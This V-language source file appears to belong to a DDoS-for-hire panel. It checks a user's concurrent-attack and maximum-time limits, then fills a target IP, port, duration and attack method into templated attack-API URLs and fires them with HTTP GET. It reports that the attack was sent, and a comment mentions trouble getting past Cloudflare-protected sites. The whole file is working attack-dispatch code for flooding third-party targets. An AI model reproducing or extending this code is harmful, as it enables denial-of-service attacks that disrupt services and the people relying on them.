module api_attack

import api_attack
import auth
import net.http
import os

pub struct API_Attack_Info {}

pub fn (mut s API_Attack_Info) send_attack(usr string, ip string, port int, time int, method string) string {
	println("$usr, $ip, $port, $time, $method")
	println('test')
	mut api_c := api_attack.API_Crud{}
	mut attk_c := auth.AttackCrud{user: usr}
	mut attk_f := auth.AttackFunc{user: usr}
	if attk_f.attack_validation() {
		if attk_f.validate_time() {
			mut apis := api_c.apis_with_method(method) // this function return an array of APIs
			// println(apis)
			for api in apis { 
				// this function 'fix_api()' takes the API and returns it replacing [host] [port] [time] [method] in API URL
				// i might have to change this. This HTTP Web Request function sucks cawk with CLOUDFLARE protected sites
				// might use C
				mut f := http.get(s.fix_api(api, ip, port, time, method)) or { panic("Failed to send attack") }
				println(f) // print response to make sure attack is going thru
			}
			// attk_c.user_conn_up() // up the user on-going attk
			return "Attack successfully sent to ${ip}:${port} for ${time} with ${method}!\r\n"
		} else {
			return "[x] Error, The time you've enter for attack (${time}) is over you're max time. Try again with less the time\r\n"
		}
	} else {
		return "You've reached the maximum concurrents. Please wait until an attack to finish!\r\n"
	}
}

pub fn (mut s API_Attack_Info) fix_api(api string, ip string, port int, time int, method string) string {
	mut g := api.replace("[host]", ip)
	g = g.replace("[port]", port.str())
	g = g.replace("[time]", time.str())
	g = g.replace("[method]", method)
	println(g)
	return g
}